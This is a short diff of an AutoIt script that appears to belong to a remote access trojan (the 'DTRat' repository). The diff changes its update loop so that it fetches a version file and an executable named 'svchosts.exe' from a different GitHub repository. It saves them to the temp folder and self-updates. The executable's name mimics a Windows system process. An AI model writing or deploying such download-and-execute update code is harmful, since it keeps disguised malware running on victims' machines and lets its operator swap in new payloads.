@@ -174,11 +174,11 @@ EndFunc   ;==>__StartupRegistry_Uninstall
 
 
 While 1
-InetGet("https://raw.githubusercontent.com/DTRat/DTRat-Win/master/version.ini", @TempDir&"\version.ini", 1)
+InetGet("https://raw.githubusercontent.com/Kettgrat/nope2x/master/version.ini", @TempDir&"\version.ini", 1)
 $lversion=IniRead(@TempDir&"\version.ini","main","version","0.0.0.1")
 $nversion=FileGetVersion(@ScriptFullPath)
 If $nversion<$lversion Then
-  InetGet("https://raw.githubusercontent.com/DTRat/DTRat-Win/blob/master/svchosts.exe", @TempDir&"\svchosts.exe", 1)
+  InetGet("https://raw.githubusercontent.com/Kettgrat/nope2x/master/svchosts.exe", @TempDir&"\svchosts.exe", 1)
   _SelfUpdate(@TempDir & '\svchosts.exe', True, 30, False)
   FileDelete(@ScriptDir&"\old.exe")
 EndIf
